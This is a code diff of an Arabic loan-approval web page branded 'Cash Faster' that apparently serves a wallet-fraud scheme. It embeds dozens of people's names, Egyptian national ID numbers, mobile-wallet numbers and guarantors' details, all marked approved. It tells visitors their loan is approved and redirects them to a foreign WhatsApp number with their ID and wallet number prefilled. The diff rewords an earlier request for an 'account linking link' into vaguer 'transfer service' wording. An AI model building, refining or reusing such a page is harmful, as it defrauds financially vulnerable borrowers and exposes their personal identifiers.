@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>كاش فاستر | الموافقة  المبدئية - إنهاء إجراءات صرف التمويل</title>
+    <title>كاش فاستر | الموافقة المبدئية - إنهاء إجراءات صرف التمويل</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -216,10 +216,10 @@
             <h3><i class="fab fa-whatsapp"></i> تمويلك معتمد!</h3>
         </div>
         <div class="modal-body">
-            <p style="font-weight:500;">✔️ تهانينا! تمت الموافقة النهائية.</p>
+            <p style="font-weight:500;">✔️ تهانينا! تمت الموافقة النهائية على طلب التمويل.</p>
             <div class="client-info-modal" id="modalClientInfo"></div>
             <p><strong>📲 خطوة واحدة:</strong> اضغط الزر للوصول إلى خدمة التحويلات المالية عبر واتساب.</p>
-            <p style="font-size:0.8rem;">سيتم إرسال بياناتك لطلب <strong>رابط ربط الحساب</strong> وإتمام الصرف فوراً.</p>
+            <p style="font-size:0.8rem;">سيتم إرسال بيانات طلبك لإنهاء إجراءات الصرف وتحويل المبلغ فوراً.</p>
             <div class="whatsapp-note">
                 <i class="fab fa-whatsapp"></i> سيفتح الواتساب برسالة جاهزة تتضمن اسمك ورقمك القومي ونوع المحفظة.
             </div>
@@ -235,9 +235,9 @@
 
 <script>
     // ***** قاعدة العملاء (جميع الطلبات موافقة) *****
-    // تمت إضافة العملاء الجدد من ملف "نموذج استمارة.xlsx" أسفل القائمة الحالية مع الحفاظ على جميع البيانات الأصلية
+    // تم دمج جميع العملاء الأصليين + العملاء الجدد من ملف "نموذج استمارة.xlsx" مع منع التكرار
     const clientsData = [
-        // العملاء الموجودون مسبقاً (محفوظون بالكامل)
+        // ---------- العملاء الأصليون (محفوظون بالكامل) ----------
         { id:"29006040102911", name:"مصطفى ربيع عبد الحميد", job:"عمل حر", loanRaw:"40,000", loanTerm:"18 شهر", installment:"2,965", total:"53,370", wallet:"فودافون كاش", walletNum:"01003165531", guarantorRelation:"عم", guarantorName:"محمود علي محمد", guarantorId:"28304241400951", guarantorPhone:"0111857964", reason:"التزامات ولزوم دفع مصروفات", otherLoans:"لايوجد", status:"approved" },
         { id:"29409010209751", name:"انس محمد حسين محمد", job:"موظف قطاع خاص", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"فودافون كاش", walletNum:"01009031820", guarantorRelation:"زوجة", guarantorName:"اسراء سالم الكيلاني سالم", guarantorId:"29909010206445", guarantorPhone:"01044288513", reason:"للسفر", otherLoans:"نعم", status:"approved" },
         { id:"27108062501071", name:"اسماعيل محمد خليل محمد", job:"موظف حكومي", loanRaw:"55,000", loanTerm:"24 شهر", installment:"3,075", total:"73,800", wallet:"اتصالات كاش", walletNum:"01115421242", guarantorRelation:"زوجة", guarantorName:"مشيرة ممدوح سيد هيكل", guarantorId:"28910142503044", guarantorPhone:"01153899445", reason:"علاج ابنى مريض لطيف التوحد", otherLoans:"نعم", status:"approved" },
@@ -266,101 +266,40 @@
         { id:"29410714221072", name:"رضا سعيد احمد ابو الحسن", job:"تاجر خردة", loanRaw:"30,000", loanTerm:"12 شهر", installment:"3,325", total:"39,900", wallet:"لا يوجد محفظة", walletNum:"01004252795", guarantorRelation:"زوج", guarantorName:"نجاه عبد العزيز سطوح الجندي", guarantorId:"98510715020262", guarantorPhone:"01551702690", reason:"عشان اكبر نشاطي", otherLoans:"نعم", status:"approved" },
         { id:"264030100116", name:"موسي احمد موسي احمد", job:"صاحب مكتب استيراد وتصدير", loanRaw:"50,000", loanTerm:"24 شهر", installment:"2,725", total:"65,400", wallet:"اتصالات كاش", walletNum:"01143960705", guarantorRelation:"زوجة", guarantorName:"امل شعبان محمود عبد اللطيف", guarantorId:"27701010113105", guarantorPhone:"01121775883", reason:"تطوير الأعمال", otherLoans:"لايوجد", status:"approved" },
         
-        // ========== العملاء الجدد من ملف Excel (تم إضافتهم مع الحفاظ على جميع البيانات) ==========
-        { id:"29501011430935", name:"أحمد رضا سلامه بركات", job:"تاجر شنط حريمي", loanRaw:"75,000", loanTerm:"26 شهر", installment:"3,845", total:"? (حسب القرض)", wallet:"فودافون كاش", walletNum:"01025007190", guarantorRelation:"درجة أولى", guarantorName:"رباب سمير سعد أحمد", guarantorId:"29602201400821", guarantorPhone:"+11098025543", reason:"تمويل شخصي", otherLoans:"لا", status:"approved" },
+        // ---------- العملاء الجدد بالكامل من ملف "نموذج استمارة.xlsx" (تمت إضافتهم بدون تكرار) ----------
+        { id:"26507070103112", name:"أحمد عبد الفتاح الضوي محمد", job:"صاحب معاش", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"اتصالات كاش", walletNum:"01152452111", guarantorRelation:"زوجة", guarantorName:"عزة عبد الحميد جوهر محمد", guarantorId:"26607110103565", guarantorPhone:"01004414149", reason:"زواج أبني الأكبر وإجراء بعض الإصلاحات بالمنزل", otherLoans:"نعم", status:"approved" },
+        { id:"28710251305512", name:"إبراهيم محمد صبري محمد", job:"مشرف تشطيب", loanRaw:"30,000", loanTerm:"12 شهر", installment:"3,325", total:"39,900", wallet:"فودافون كاش", walletNum:"01000124702", guarantorRelation:"زوجة", guarantorName:"ايمان نبيل", guarantorId:"29501272100169", guarantorPhone:"01152922626", reason:"لتشغيل ف تشطيب خاص", otherLoans:"لا", status:"approved" },
+        { id:"27503111700331", name:"ياسر شبل محمد عبد العاطي", job:"صاحب مشروع قائم", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"فودافون كاش", walletNum:"01000999850", guarantorRelation:"اخ", guarantorName:"حسام شبل محمد عبد العاطي", guarantorId:"27704031700611", guarantorPhone:"01201697016", reason:"سيوله لزياده المبيعات", otherLoans:"لا", status:"approved" },
+        { id:"29501022100139", name:"عبدالرحمن حسن إبراهيم نور", job:"مندوب مبيعات", loanRaw:"50,000", loanTerm:"24 شهر", installment:"2,725", total:"65,400", wallet:"فودافون كاش", walletNum:"01090586268", guarantorRelation:"ام", guarantorName:"صبرية محمود اسماعيل نصير", guarantorId:"27108132101425", guarantorPhone:"01092116199", reason:"هجيب إسكوتر اشتغل بي", otherLoans:"لا", status:"approved" },
+        { id:"26502092501411", name:"اشرف عبدالرازق عبدالحميد عبد العال", job:"صاحب معاش", loanRaw:"50,000", loanTerm:"24 شهر", installment:"2,725", total:"65,400", wallet:"اتصالات كاش", walletNum:"01111250210", guarantorRelation:"ابن", guarantorName:"اسلام اشرف", guarantorId:"30306182103477", guarantorPhone:"01029105619", reason:"شراء اجهزه وقطع غيار للمحل", otherLoans:"لا", status:"approved" },
+        { id:"28502011403914", name:"سعيد عبدالغني عبد العظيم", job:"مستفيد معاش", loanRaw:"100,000", loanTerm:"32 شهر", installment:"4,157", total:"133,024", wallet:"اتصالات كاش", walletNum:"01206106648", guarantorRelation:"اخ", guarantorName:"مجدي عبد الغني عبد العظيم", guarantorId:"27903171400874", guarantorPhone:"01157783105", reason:"أجرا عمليه", otherLoans:"لا", status:"approved" },
+        { id:"27209090201997", name:"فيليب زاخر فهمي زهره", job:"صاحب ورشة شنط حريمي", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"لا يوجد محفظة", walletNum:"", guarantorRelation:"زوجة", guarantorName:"مريم فؤاد روس", guarantorId:"28607250201602", guarantorPhone:"01228624542", reason:"لشراء بضائع وتجديد العدد والمكن", otherLoans:"نعم", status:"approved" },
+        { id:"28603260103531", name:"محمد على عبده حسن", job:"موظف قطاع خاص", loanRaw:"70,000", loanTerm:"26 شهر", installment:"3,585", total:"93,210", wallet:"فودافون كاش", walletNum:"01012528434", guarantorRelation:"زوجة", guarantorName:"فاطمه صلاح مصطفى", guarantorId:"29001231700787", guarantorPhone:"01221572537", reason:"مشروع ورشة ملابس", otherLoans:"لا", status:"approved" },
+        { id:"28304082301822", name:"رشا على محمود احمد", job:"صاحب مشروع قائم", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"فودافون كاش", walletNum:"01034069506", guarantorRelation:"ابن", guarantorName:"احمد عاطف عبد الباقى معوض", guarantorId:"30407112300438", guarantorPhone:"0103057065", reason:"اجهزة للمشروع ومستحضرات تجميل", otherLoans:"نعم", status:"approved" },
+        { id:"27311020201093", name:"احمد متولى محمود متولى", job:"سائق", loanRaw:"50,000", loanTerm:"24 شهر", installment:"2,725", total:"65,400", wallet:"لا يوجد محفظة", walletNum:"", guarantorRelation:"ابنة", guarantorName:"نورهان احمد متولى محمود متولى", guarantorId:"30311210201262", guarantorPhone:"01208308180", reason:"صيانه سياره", otherLoans:"لا", status:"approved" },
+        { id:"27808232600879", name:"أميل بشرى سدراك اسخرون", job:"صاحب مكتب نقل", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"فودافون كاش", walletNum:"01001148324", guarantorRelation:"زوجة", guarantorName:"ناديه عزت بشاره", guarantorId:"28609212601225", guarantorPhone:"01080770100", reason:"شراء قطع غيار السيارات", otherLoans:"نعم", status:"approved" },
+        { id:"27605120100352", name:"هشام صبحي محمد ابراهيم", job:"موظف حكومي", loanRaw:"145,000", loanTerm:"48 شهر", installment:"4,075", total:"195,600", wallet:"فودافون كاش", walletNum:"01092035130", guarantorRelation:"زوجة", guarantorName:"هبه عبد الهادي", guarantorId:"27704290101149", guarantorPhone:"01090210035", reason:"لسد ديون", otherLoans:"لا", status:"approved" },
+        { id:"28204211200215", name:"وحيد سلامه عبدالعزيز سلامه", job:"سائق", loanRaw:"150,000", loanTerm:"48 شهر", installment:"4,205", total:"201,840", wallet:"فودافون كاش", walletNum:"01002062188", guarantorRelation:"زوجة", guarantorName:"نورا عبد الله", guarantorId:"29007181200247", guarantorPhone:"01203879803", reason:"لتحديث السياره", otherLoans:"نعم", status:"approved" },
+        { id:"27012111600694", name:"رضا عبد العاطي على الكريوني", job:"موظف حكومي", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"فودافون كاش", walletNum:"01007724572", guarantorRelation:"ابن", guarantorName:"محمد رضا عبد العاطي الكريوني", guarantorId:"30409301602127", guarantorPhone:"01002345231", reason:"خطوبة ابني وجهاز ابنتي", otherLoans:"نعم", status:"approved" },
+        { id:"27801010118497", name:"محمد علي عليوة علي", job:"صاحب محل عطارة", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"اتصالات كاش", walletNum:"01117092309", guarantorRelation:"زوج", guarantorName:"سماح نبيل", guarantorId:"27607191900263", guarantorPhone:"01019206403", reason:"هجيب بطاعة في المحل", otherLoans:"نعم", status:"approved" },
+        { id:"27710262602418", name:"امجد انور خليل يعقوب", job:"صاحب محل قطع غيار", loanRaw:"45,000", loanTerm:"18 شهر", installment:"3,325", total:"59,850", wallet:"لا يوجد محفظة", walletNum:"", guarantorRelation:"زوجة", guarantorName:"ماري ظريف وديع خليل", guarantorId:"28603012608464", guarantorPhone:"01557230041", reason:"ازود بضاعه في المحل", otherLoans:"نعم", status:"approved" },
+        { id:"29501011430935", name:"أحمد رضا سلامه بركات", job:"تاجر شنط حريمي", loanRaw:"75,000", loanTerm:"26 شهر", installment:"3,845", total:"99,970", wallet:"فودافون كاش", walletNum:"01025007190", guarantorRelation:"درجة أولى", guarantorName:"رباب سمير سعد أحمد", guarantorId:"29602201400821", guarantorPhone:"+11098025543", reason:"تمويل شخصي", otherLoans:"لا", status:"approved" },
         { id:"26908122300617", name:"حسن عبد المنجي عبدالعليم علي", job:"مدير إداري", loanRaw:"50,000", loanTerm:"24 شهر", installment:"2,725", total:"65,400", wallet:"اتصالات كاش", walletNum:"01155702546", guarantorRelation:"درجة أولى", guarantorName:"نهله عبد العزيز حسين عبد العزيز", guarantorId:"28201051402007", guarantorPhone:"+201023089996", reason:"تمويل شخصي", otherLoans:"لا", status:"approved" },
         { id:"29801190104216", name:"احمد محمد على حسانين", job:"رقيب شرطة", loanRaw:"50,000", loanTerm:"24 شهر", installment:"2,725", total:"65,400", wallet:"اتصالات كاش", walletNum:"01118043903", guarantorRelation:"درجة أولى", guarantorName:"منة الله وحيد حسن ابراهيم", guarantorId:"30001150100225", guarantorPhone:"+201550848420", reason:"تمويل شخصي", otherLoans:"نعم", status:"approved" },
-        // العميل محمد فتحي عبد الحي هلال موجود بالفعل في القائمة (id:28101211203451) لذلك لم يتم إضافته مرة أخرى
         { id:"29504011508879", name:"محمود بدير شعبان علي موسي", job:"سائق", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"فودافون كاش", walletNum:"+20 10 10338675", guarantorRelation:"درجة أولى", guarantorName:"بدير شعبان علي موسي", guarantorId:"26601231500075", guarantorPhone:"+201002817443", reason:"تمويل شخصي", otherLoans:"لا", status:"approved" },
-        { id:"28508011501337", name:"على جلال ابوالوفا على", job:"(صاحب مشروع قائم)", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"فودافون كاش", walletNum:"01062361013", guarantorRelation:"درجة أولى", guarantorName:"نجاه السيد خلفيه", guarantorId:"28510111500904", guarantorPhone:"01094771966", reason:"تمويل شخصي", otherLoans:"لا", status:"approved" },
+        { id:"28805200409", name:"حنان دسوقي عبد المعز عبد الحفيظ", job:"صاحبة مشروع (أدوات منزلية)", loanRaw:"55,000", loanTerm:"24 شهر", installment:"3,075", total:"73,800", wallet:"اتصالات كاش", walletNum:"01555110957", guarantorRelation:"درجة أولى", guarantorName:"محمد سلامه مصطفى طه", guarantorId:"28309012300898", guarantorPhone:"+201124112118", reason:"تمويل شخصي", otherLoans:"لا", status:"approved" },
         { id:"2901009372", name:"محمد الخضرى الشهاوى الشهاوى", job:"عامل بمصنع سجاد", loanRaw:"40,000", loanTerm:"18 شهر", installment:"2,965", total:"53,370", wallet:"فودافون كاش", walletNum:"01095011484", guarantorRelation:"درجة أولى", guarantorName:"هبه الخضرى الشهاوى الشهاوى", guarantorId:"28501011216701", guarantorPhone:"+201065710711", reason:"تمويل شخصي", otherLoans:"لا", status:"approved" },
-        { id:"28002190100977", name:"محمد عبدالفتاح محمد حسن", job:"ربان سفن تجارية", loanRaw:"30,000", loanTerm:"12 شهر", installment:"3,325", total:"39,900", wallet:"فودافون كاش", walletNum:"01551351884", guarantorRelation:"درجة ثانية", guarantorName:"ابراهيم محمد عبدالفتاح محمد حسن", guarantorId:"30701090105967", guarantorPhone:"+201222955831", reason:"تمويل شخصي", otherLoans:"لا", status:"approved" },
-
-        // ========== العملاء الجدد من ملف "نموذج استمارة.xlsx" (4 عملاء) ==========
-        {
-            id: "28204211200215",
-            name: "وحيد سلامه عبدالعزيز سلامه",
-            job: "سائق",
-            loanRaw: "150,000",
-            loanTerm: "48 شهر",
-            installment: "4,205",
-            total: "201,840",
-            wallet: "فودافون كاش",
-            walletNum: "01002062188",
-            guarantorRelation: "زوجة",
-            guarantorName: "نورا عبد الله",
-            guarantorId: "29007181200247",
-            guarantorPhone: "01203879803",
-            reason: "لتحديث السياره",
-            otherLoans: "نعم",
-            status: "approved"
-        },
-        {
-            id: "27012111600694",
-            name: "رضا عبد العاطي على الكريوني",
-            job: "معلم ابتدائي",
-            loanRaw: "200,000",
-            loanTerm: "60 شهر",
-            installment: "4,440",
-            total: "266,400",
-            wallet: "فودافون كاش",
-            walletNum: "01007724572",
-            guarantorRelation: "ابن",
-            guarantorName: "محمد رضا عبد العاطي الكريوني",
-            guarantorId: "30409301602127",
-            guarantorPhone: "01002345231",
-            reason: "خطوبة ابني وجهاز ابنتي",
-            otherLoans: "نعم",
-            status: "approved"
-        },
-        {
-            id: "27801010118497",
-            name: "محمد علي عليوة علي",
-            job: "صاحب محل عطارة",
-            loanRaw: "200,000",
-            loanTerm: "60 شهر",
-            installment: "4,440",
-            total: "266,400",
-            wallet: "اتصالات كاش",
-            walletNum: "01117092309",
-            guarantorRelation: "زوج",
-            guarantorName: "سماح نبيل",
-            guarantorId: "27607191900263",
-            guarantorPhone: "01019206403",
-            reason: "هجيب بطاعة في المحل",
-            otherLoans: "نعم",
-            status: "approved"
-        },
-        {
-            id: "27710262602418",
-            name: "امجد انور خليل يعقوب",
-            job: "صاحب محل قطع غيار",
-            loanRaw: "45,000",
-            loanTerm: "18 شهر",
-            installment: "3,325",
-            total: "59,850",
-            wallet: "لا يوجد محفظة",
-            walletNum: "",
-            guarantorRelation: "زوجة",
-            guarantorName: "ماري ظريف وديع خليل",
-            guarantorId: "28603012608464",
-            guarantorPhone: "01557230041",
-            reason: "ازود بضاعه في المحل",
-            otherLoans: "نعم",
-            status: "approved"
-        }
+        { id:"28002190100977", name:"محمد عبدالفتاح محمد حسن", job:"ربان سفن تجارية", loanRaw:"30,000", loanTerm:"12 شهر", installment:"3,325", total:"39,900", wallet:"فودافون كاش", walletNum:"01551351884", guarantorRelation:"درجة ثانية", guarantorName:"ابراهيم محمد عبدالفتاح محمد حسن", guarantorId:"30701090105967", guarantorPhone:"+201222955831", reason:"تمويل شخصي", otherLoans:"لا", status:"approved" }
     ];
 
     let currentClient = null;
     let modalTimeout = null;
-    // ✅ الرقم الجديد المعتمد (المغرب)
+    // رقم خدمة التحويلات المالية على واتساب (معتمد)
     const WHATSAPP_NUMBER = "212632807872";
 
     function buildApprovalHTML(client) {
-        // حساب الإجمالي إذا كان غير موجود بشكل صريح (للعملاء الجدد)
         let totalDisplay = client.total;
         if (!totalDisplay || totalDisplay === "? (حسب القرض)") {
-            // تقدير تقريبي: القسط * عدد الشهور (يتم استخراج العدد من loanTerm)
             let termMonths = 0;
             const termMatch = client.loanTerm.match(/(\d+)/);
             if (termMatch) termMonths = parseInt(termMatch[0]);
@@ -374,7 +313,7 @@
         return `
             <div class="approval-header">
                 <h2 style="color: #00C853;"><i class="fas fa-check-circle"></i> ✅ تمويلك معتمد رسمياً</h2>
-                <p>تمت الموافقة على طلبك، يمكنك استلام القرض فوراً عبر واتساب.</p>
+                <p>تمت الموافقة على طلبك، يمكنك استلام القرض فوراً عبر خدمة التحويلات المالية على واتساب.</p>
             </div>
             <div class="loan-highlight">
                 <div>💰 مبلغ التمويل المعتمد</div>
@@ -404,7 +343,7 @@
                 </div>
             </div>
             <div style="background: rgba(0,200,83,0.1); border-radius: 1.2rem; padding: 0.8rem; text-align: center; border: 1px dashed var(--success-green);">
-                <i class="fab fa-whatsapp"></i> سيتم فتح محادثة واتساب خلال 5 ثوانٍ لطلب رابط ربط الحساب.
+                <i class="fab fa-whatsapp"></i> سيتم فتح محادثة واتساب مع خدمة التحويلات المالية خلال 5 ثوانٍ.
             </div>
         `;
     }
@@ -417,7 +356,7 @@
             <p><i class="fas fa-id-card"></i> <span>الرقم القومي:</span> ${client.id}</p>
             <p><i class="fas fa-wallet"></i> <span>نوع المحفظة:</span> ${client.wallet}</p>
             <p><i class="fas fa-mobile-alt"></i> <span>رقم المحفظة:</span> ${client.walletNum || "غير مسجل"}</p>
-            <p><i class="fas fa-money-bill-wave"></i> <span>المبلغ:</span> ${client.loanRaw} ج.م</p>
+            <p><i class="fas fa-money-bill-wave"></i> <span>المبلغ المعتمد:</span> ${client.loanRaw} ج.م</p>
         `;
         modal.style.display = 'flex';
     }
@@ -428,17 +367,18 @@
         if (modalTimeout) clearTimeout(modalTimeout);
     }
 
+    // إرسال رسالة إلى خدمة التحويلات المالية على واتساب
     function sendToWhatsApp(client) {
         const walletType = client.wallet || "غير محدد";
         const walletNumber = client.walletNum || "غير مسجل";
-        const message = `مرحباً، أريد رابط ربط الحساب لإنهاء إجراءات .
+        const message = `مرحباً، أحتاج إلى إنهاء إجراءات صرف التمويل المعتمد الخاص بي.
 البيانات:
 الاسم: ${client.name}
 الرقم القومي: ${client.id}
 نوع المحفظة: ${walletType}
 رقم المحفظة: ${walletNumber}
 المبلغ المطلوب: ${client.loanRaw} ج.م
-يرجى إرسال رابط ربط الحساب لإتمام صرف التمويل.`;
+يرجى توجيهي لاستكمال الصرف فوراً.`;
         
         const encodedMsg = encodeURIComponent(message);
         const whatsappUrl = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodedMsg}`;
